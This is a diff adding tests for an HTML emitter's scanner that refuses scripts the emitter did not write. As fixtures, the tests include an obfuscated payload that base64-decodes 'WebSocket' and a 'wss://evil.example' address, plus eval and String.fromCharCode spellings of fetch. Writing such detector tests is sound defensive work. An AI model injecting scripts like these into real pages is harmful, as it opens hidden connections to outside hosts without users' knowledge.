@@ -298,3 +298,73 @@ test('an alt attribute is text but an img src is not, on the same element', () =
   assert.equal(findings.length, 1, `expected exactly the src to be flagged, got: ${findings.map((f) => f.message).join(' | ')}`);
   assert.match(findings[0].message, /img\[src\]/);
 });
+
+
+// --------------------------------------------------------------------- C16
+
+import { scanForeignScripts, EMITTED_SCRIPTS } from '../../src/emit/scan.js';
+
+test('the artifact carries no script the emitter did not write (C16)', () => {
+  const clean = [
+    '<script id="pp-model" type="application/octet-stream">AAAA</script>',
+    '<script id="pp-media" type="application/octet-stream"></script>',
+    '<script id="pp-manifest" type="application/json">{}</script>',
+    '<script id="pp-runtime">var a = 1;</script>',
+    '<script id="pp-boot">boot();</script>',
+  ].join('\n');
+  assert.deepEqual(scanForeignScripts(clean, { allowed: EMITTED_SCRIPTS }), []);
+
+  // The one planted reference the token scanner could not see: no API name, no
+  // URL, nothing to match — and it does not matter, because the element it
+  // arrived in is not one the emitter writes.
+  const obfuscated = `${clean}\n<script>new (window[atob("V2ViU29ja2V0")])(atob("d3NzOi8vZXZpbC5leGFtcGxlL3M="))</script>`;
+  const findings = scanForeignScripts(obfuscated, { allowed: EMITTED_SCRIPTS });
+  assert.equal(findings.length, 1, findings.map((f) => f.message).join(' | '));
+  assert.equal(findings[0].severity, 1);
+  assert.equal(findings[0].code, 'NETWORK_REFERENCE');
+  assert.match(findings[0].message, /a script element with no id/);
+
+  // Every other spelling of the same idea, none of which the token scanner sees.
+  const spellings = [
+    '<script>eval(String.fromCharCode(102,101,116,99,104))</script>',
+    '<script id="analytics" type="module">import("./x.js")</script>',
+    '<script id="pp-boot">boot()</script><script id="pp-boot">boot()</script>',
+    '<script id="pp-model">this one executes</script>',
+  ];
+  for (const html of spellings) {
+    const hits = scanForeignScripts(html, { allowed: EMITTED_SCRIPTS });
+    assert.ok(hits.length > 0, `${html} was not refused`);
+    for (const f of hits) assert.equal(f.severity, 1);
+  }
+});
+
+test('a scene may carry no script at all (C16)', () => {
+  // A scene renders content. Content that renders a <script> is content that
+  // runs, whatever the emitter's own document is allowed to hold.
+  assert.deepEqual(scanForeignScripts('<div><p>fine</p></div>'), []);
+  const hits = scanForeignScripts('<div><script id="pp-runtime">go()</script></div>');
+  assert.equal(hits.length, 1);
+  assert.match(hits[0].message, /not one of the elements the emitter writes/);
+});
+
+test('a raw block that smuggles obfuscated script is refused by emit (C16)', async () => {
+  // The route the §20 critic reached for: prospect-supplied markup, rendered
+  // verbatim, carrying a WebSocket whose name and address are both base64. No
+  // layout in the closed set renders `raw` blocks as HTML today, so this fixture
+  // layout does — a law that only holds because nobody has exercised the path
+  // yet is not a law.
+  registerTestLayouts({ renderRawBlocks: true });
+  const proof = emitProof();
+  proof.specimens[0].blocks.push({
+    type: 'raw',
+    html: '<script>new (window[atob("V2ViU29ja2V0")])(atob("d3NzOi8vZXZpbC5leGFtcGxlL3M="))</script>',
+  });
+  const { js, css } = runtimeBundle();
+  const result = await emit(proof, {}, { runtimeJs: js, runtimeCss: css, clock: FIXED_CLOCK });
+  assert.equal(result.ok, false, 'an artifact carrying a script the emitter did not write must be refused');
+  const blocking = result.detail.findings.filter((f) => f.severity === 1 && f.code === 'NETWORK_REFERENCE');
+  assert.ok(blocking.length > 0);
+  assert.ok(blocking.some((f) => /the emitter writes none/.test(f.message)), blocking.map((f) => f.message).join(' | '));
+
+  registerTestLayouts();
+});
